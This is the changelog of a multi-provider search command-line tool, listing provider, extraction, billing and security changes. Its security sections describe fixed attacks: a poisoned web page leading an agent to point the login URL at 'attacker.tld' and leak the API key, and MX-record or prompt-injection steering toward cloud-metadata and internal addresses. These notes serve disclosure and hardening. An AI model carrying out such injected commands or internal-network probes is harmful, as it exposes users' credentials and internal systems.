# Changelog

## 0.12.2 — 2026-10-31

- `search agent-info` now states that fused modes wait for every provider and
  that `-c` is clamped to each provider's per-request maximum.

## 0.12.1 — 2026-10-31

Behaviour changes: fused modes no longer stop early; every configured
provider contributes unless it fails or hits its own timeout, so the slowest
provider now bounds latency. `-c` above a provider's per-request maximum is
clamped per provider instead of failing it.

Changes:
- Fused modes (general, news, academic, reddit, deep, scholar) wait for
  every provider instead of stopping once enough results arrived. Each
  provider still stops at its own timeout, so the slowest provider bounds
  the search; ranking now fuses over everyone. `providers_cancelled` stays
  in the envelope and is empty in normal runs.

Fixes:
- `-c` above a provider's per-request maximum no longer fails the request:
  Brave web (20), Jina (20) and the others are clamped, and fusion makes up
  the total.
- News mode: Brave news results were never parsed (always empty); Serper
  news returned nothing for counts above 10.

## 0.12.0 — 2026-10-31

Security:
- Provider API keys no longer leak through error text: every error message
  (engine warnings, `search doctor`, `search usage`, JSON envelopes) is
  redacted.
- `search whoami` and `search logout --revoke` now apply the same
  metasearch host check as `search login`, so a tampered config cannot send
  the stored token to another host. `logout` still clears the local key.

Features:
- New `reddit` mode: Reddit threads fused across Perplexity's Search API,
  Serper, Kagi, Tavily and Brave, scoped to reddit.com. Thread URLs only, one
  canonical URL per thread (`extra.post_id`, `subreddit`, `comment_id`).
  Perplexity results carry indexed post and comment text.
- `extract`/`scrape` on a reddit.com or redd.it thread URL returns the
  thread's indexed copy from the Perplexity Search API (source `reddit`,
  `extra.copy: "search_index"`, `extra.complete: false`) instead of running
  the scraper chain, which only collects Reddit's block pages. Non-thread
  URLs and threads no index holds fail with `no_sanctioned_route` (category
  `blocked`). reddit.com itself is never requested.
- Opt-in `reddit.reader = "jina"` (`SEARCH_REDDIT_READER`): extract renders
  the full live thread through Jina Reader (`extra.copy: "live_render"`) and
  falls back to the index copy. Outside Reddit's terms for automated access;
  off by default, warns on every use. While unset, index copies carry
  `extra.reader_hint` so agents can offer the opt-in. The query cache keys
  extract results on this setting.
- New `search billing`: monthly usage per provider for the last six UTC
  calendar months, newest first, in each provider's native unit. Jina
  (tokens), Firecrawl (credits) and xAI (USD, management key) report real
  monthly history; Tavily (credits) and SerpApi (searches) fill the current
  month from their current billing cycle (marked `*`); everything else is
  estimated in USD from the local search logs (marked `~`), and months
  before the oldest log show `-`. JSON tags every cell with its `source`
  (`api`, `api_current_period`, `estimate`, `none`).
- `search usage` now reports Serper's credit balance (`/account`) and
  Jina's token wallet (Jina API-dashboard backend, not in Jina's public
  docs).
- extract/scrape: papers are read by identifier instead of through
  publisher pages, which sit behind bot walls and robots rules naming AI
  agents. A DOI (doi.org or embedded in a publisher URL or query), arXiv id,
  PubMed/PMC id, nature.com article or ScienceDirect PII resolves through
  OpenAlex, with Crossref (metadata) and Unpaywall (open-access copy) when
  OpenAlex lacks the work. Full text comes from Europe PMC, arXiv's HTML
  rendering, or the open-access landing page; otherwise the result is
  metadata, abstract and OA links. New `settings.email`
  (`SEARCH_SETTINGS_EMAIL`) is sent as the Crossref/OpenAlex polite-pool
  contact and enables Unpaywall, which requires it.

## 0.11.0 — 2026-10-31

Behaviour changes: the Perplexity answer label is now `perplexity_fast`
(was `perplexity_sonar-pro`); the stealth scraper is no longer a default
feature; `search update` no longer prompts for confirmation.

- Extract chain: login walls, bot-challenge pages and JavaScript-only shells
  are now treated as failed extractions (`blocked`) instead of successes, so
  the chain escalates and suggests a sanctioned route where one exists.
- extract/scrape: sites that wall off their HTML but publish a sanctioned
  route are read through it before the scraper chain. Stack Exchange
  questions use API v2.3 (question plus top 10 answers, CC BY-SA attribution;
  `STACKEXCHANGE_KEY` raises the keyless 300/day quota). GitHub repos, files
  and issues/PRs use the REST API (`GITHUB_TOKEN`/`GH_TOKEN` optional; falls
  back to the chain when rate-limited). Hacker News items use the Algolia API.
  Medium posts come from the author's or publication's RSS feed when recent
  enough, otherwise the chain runs. Telegram channels and posts use the
  t.me/s/ public preview. YouTube videos get oEmbed metadata plus an English
  transcript when `yt-dlp` is on PATH. LinkedIn, Quora, Glassdoor, Instagram
  and Discord fail fast with `no_sanctioned_route` (category `blocked`);
  `-p <provider>` still forces the chain. Routes are pluggable via
  `sanctioned::Route`.
- extract/scrape: wall detection measures visible text (markdown link
  targets excluded) and recognises Quora, Glassdoor and Google block pages.

- xAI: the default model moves from `grok-4-1-fast` (retired 2026-05-15; xAI
  now redirects it to `grok-4.3` at grok-4.3 prices) to `grok-4.3`
  explicitly. The model is configurable via a new `[xai]` section
  (`search config set xai.model <id>` or `SEARCH_XAI_MODEL`) so the next
  retirement doesn't need a release; `search config show` displays it.
- xAI: `-d`/`--exclude-domain` (X handles in `social` mode) are no longer sent
  together — x_search rejects requests that set both `allowed_x_handles` and
  `excluded_x_handles`. `-d` wins. Each list is stripped of `@`,
  deduplicated, and capped at the API maximum of 20.
- xAI: `-f` date windows now include today. x_search treats `to_date` as
  exclusive, so `-f day` previously returned only yesterday's posts.
- `search stats` estimates $0.08 per xAI call (grok-4.3 tokens plus X Search
  at $5 per 1,000 posts fetched), up from $0.05.
- Perplexity moved off the retired Sonar `/chat/completions` endpoint (end of
  support 2026-09-27) to the Agent API (`POST /v1/agent`) with the `fast`
  effort level, Perplexity's documented replacement for `sonar-pro`. Output is
  unchanged in shape: an answer in `answers[]` (now labelled
  `perplexity_fast`) plus its cited sources. `-d`/`--exclude-domain` and `-f`
  now go explicitly on the `web_search` tool's filters; when both include and
  exclude domains are given, only the allowlist is sent (the API accepts one
  mode per request, and the old code mixed them). `--country` is now forwarded
  as `user_location.country`. `search stats` estimates $0.003 per call, down
  from $0.012.
- Stealth scraper is now opt-in (`--features stealth`) and no longer in the
  default build or release binaries. It moves to the stable wreq 0.16 /
  wreq-util 0.2 line (Chrome 149 profile; needs Rust 1.98+, cmake, clang and
  a C++ compiler). It now sends only the emulation profile's own headers: the
  forged Google `Referer` and the hand-written Chrome 136 client hints are
  gone. Fixes: responses are decompressed (every stealth fetch previously
  failed with `garbage_content`), and the HTML text fallback no longer panics
  or garbles non-ASCII text. The stealth build links on Linux; CI builds and
  tests it there.
- Install docs point at this fork: install.sh, GitHub Releases, or
  `cargo install --git https://github.com/alepar/search-cli`. The Homebrew tap
  and crates.io instructions were upstream's.
- Tavily: result dates now populate (the code read `published_time`; the API
  field is `published_date`). Auth moves to the documented Bearer header, and
  `-c` is capped at the API maximum of 20.
- `search usage` on a Tavily pay-as-you-go account reports the overage
  ("pay-as-you-go: N credits of overage this cycle") instead of a negative
  remaining balance. JSON gains `pay_as_you_go`, `plan_remaining`,
  `paygo_usage`, `paygo_limit` and `summary`; `credits_remaining` is null when
  PAYG has no cap.
- SerpApi: Scholar results carry their citation counts again (`cited_by` is
  read from `inline_links`). Google News no longer gets `num`/`tbs`, which that
  engine does not take; `-f` maps to a `when:` query operator there, and news
  dates prefer `iso_date`.
- Extract/scrape: the Jina Reader rung runs without a Jina key (r.jina.ai
  serves keyless requests at a lower rate limit), so URL extraction works with
  no provider configured. A configured key is still sent.
- Parallel: moved from `/v1beta/search` to the GA `/v1/search`. Result count,
  excerpt size, location (now lowercase ISO alpha-2) and source policy go under
  `advanced_settings`, as v1 requires; results now carry `publish_date`.
  `search stats` estimates $0.001 per call (fast mode), down from $0.005.
- Browserless: `/content` runs with `bestAttempt`, so the rung returns
  partial renders instead of failing on a selector timeout.
- The bare-query shorthand accepts search options on either side of the
  query: `search "rust tokio" -p tavily -c 2` and `search -p tavily "rust
  tokio"` now both search "rust tokio" with Tavily. Before, trailing options
  were searched as literal text and leading ones were rejected. `search search`
  also takes the query as bare words. After the first query word only exact
  search options count, so operators such as `jaguar -car` or
  `-site:pinterest.com` stay part of the query.
- `search update --check` compares versions as semver, matching what
  `search update` installs; a local build newer than the latest release no
  longer reports an update.
- Serper places results get a URL (the business website, else a Google Maps
  link from the place's `cid`) and the address as the snippet; places items
  carry no `link`.
- Maintenance: Rust edition 2024 (MSRV 1.89; the opt-in stealth feature needs
  1.98), refreshed dependencies (clears the RustSec advisories that turned CI
  red), self_update 1.3 with SHA256SUMS verification and no interactive prompt
  in `search update`, weekly CI with Dependabot, and an MSRV job.

## 0.10.0 — 2026-10-31

First release from the alepar/search-cli fork (based on upstream 0.9.0).

- Kagi added as the 14th provider (general/news/deep). Uses Kagi Search API
  v1 (`POST https://kagi.com/api/v1/search`, Bearer auth), open to all Kagi
  accounts as a public preview, billed per request ($12 per 1,000). Key:
  `KAGI_API_KEY`, `SEARCH_KEYS_KAGI` or `keys.kagi`. `-d`/`--exclude-domain`
  map to an inline lens, `-f` to `filters.after`, `--country` to
  `filters.region`; `--lang` is not supported by the API. Kagi v1 reports no
  balance, so `search usage` lists it as unsupported; `search stats` estimates
  $0.012 per call. A malformed key (Kagi answers HTTP 400
  `general.invalid_token`) is reported as an auth failure.
- `search update` and `install.sh` now fetch releases from alepar/search-cli.
- `self_update` and `readability` no longer pull in native-tls/OpenSSL, which
  collided with the BoringSSL used by the `stealth` feature at link time.

## 0.9.0 — 2026-07-25

### Terminal login
- `search login` signs in to a metasearch.sh account using the OAuth 2.0
  device authorization grant (RFC 8628): the CLI prints a short confirmation
  code, opens the browser, and polls until the request is approved. No key is
  ever copied by hand. `--no-browser` covers headless and SSH sessions.
- `search whoami` reports the account, balance, and key behind the stored
  credentials; `search logout` clears them locally, `--revoke` also kills the
  key server-side so a lost machine stops spending.
- Credentials live in the same 0600 config file as provider keys, under a new
  `[metasearch]` section. Precedence: `METASEARCH_TOKEN` env →
  `SEARCH_METASEARCH_TOKEN` env → config file. `METASEARCH_URL` points the CLI
  at a self-hosted or local instance.
- Polling survives dropped keep-alive connections, sleeping laptops, and wifi
  blips — only a sustained outage aborts a login.

Search dispatch is unchanged: this release stores credentials, it does not yet
route queries through metasearch.sh.

### Security
- `search login` now refuses to send credentials anywhere but
  `https://metasearch.sh`. An agent reading a poisoned web page could
  previously run `search config set metasearch.url https://attacker.tld` (or
  pass `--url`) and the next login would hand the API key to whoever asked.
  Self-hosted instances set `METASEARCH_ALLOW_INSECURE_HOST=1` to consent;
  plain http is refused outright except on loopback.
- `search verify` applies the same default-deny network guard as
  extract/scrape. An MX record is attacker-controlled: a hostile domain could
  point it at `169.254.169.254` or a LAN address and read what is listening
  off the SMTP response codes.

## 0.8.0 — 2026-07-02

Production-hardening release from a full blindspot audit (cross-checked by an
independent GPT-5.5 review).

### Safety
- Extract/scrape refuse private, loopback, link-local, CGNAT, and cloud-metadata
  targets by default (`--allow-private` overrides) — the local stealth rung
  could otherwise be steered into internal endpoints by prompt injection.
- Empty queries, queries over 2000 chars, and `-c` outside 1–100 exit 3 before
  any paid API call fans out.
- Scraped content is tagged `extra.content_origin: untrusted_web_content`.
- `search verify` documents its SMTP-probing reputation tradeoff.

### Secrets
- config.toml is written 0600 via atomic temp+rename; pre-existing 644 files
  are tightened on load.
- `search config set keys.x -` reads the value from stdin (keeps keys out of
  shell history and `ps`).
- API keys are redacted from every error message and provider-failure reason.

### Telemetry & analytics
- `search stats`: searches/modes/providers, failures, cancellations, estimated
  spend (static price table), measured balance burn (from `search usage`
  snapshots), cache-hit rate, repeated queries, and read-through (which
  providers' results agents actually extract afterwards). `--prune N` deletes
  old logs.
- Log entries carry a schema version, cache hits are logged, lines are written
  atomically, and `SEARCH_LOG=off` disables logging entirely.

### Controls
- `--no-cache` forces a fresh search; `search cache clear` empties the cache.
  Cache reads and writes are now gated identically (a filtered search can no
  longer poison the plain-query cache).
- `--max-chars N` caps snippet/answer length — bound how much web content
  enters an agent context.
- `--country` / `--lang` locale bias, applied by serper/serpapi/brave/parallel.
- `search doctor` test-fires every configured provider (one minimal billed
  request each) and reports health, latency, and failure category.

### Result quality
- Known tracking parameters (`utm_*`, `fbclid`, `gclid`, …) are stripped from
  the dedup key, so URL variants no longer defeat fusion consensus.
- 429 responses honor `Retry-After` (capped at 2s) before retrying.

### Portability & supply chain
- `stealth` is a default-on cargo feature; `--no-default-features` builds
  without wreq/BoringSSL, enabling Linux. Releases now include a Linux x86_64
  tarball and a SHA256SUMS file; install.sh verifies checksums and refuses
  unverified downloads.
- CI adds a Linux job and a cargo-deny gate (advisories/licenses/sources).
  First run fixed a rustls-webpki CVE and two hickory-proto DNS
  vulnerabilities (verify.rs ported to hickory-resolver 0.26).

## 0.7.1 — 2026-07-02
- Linkup added as the 13th provider (general/news/deep, full filter support,
  credits balance in `search usage`).
- Extract chain demotes garbage scrapes (binary bytes, anti-bot interstitials)
  to failures so the fallback escalates instead of returning junk.

## 0.7.0 — 2026-07-02
- Reciprocal rank fusion across providers: consensus URLs rank first,
  deterministically; early-stop gained a 1.5s grace window and `deep` never
  cancels.
- Envelope honesty: `provider_results`, `providers_cancelled`, `warnings`,
  `cached`/`cache_age_secs`, and AI answers moved to a separate `answers[]`.
- Self-describing `agent-info` modes generated from a single routing registry;
  URL-mode input validation; `search usage` credit visibility.

## 0.6.2 and earlier
- Multi-provider search, email verification, self-update, skill install. See
  git history.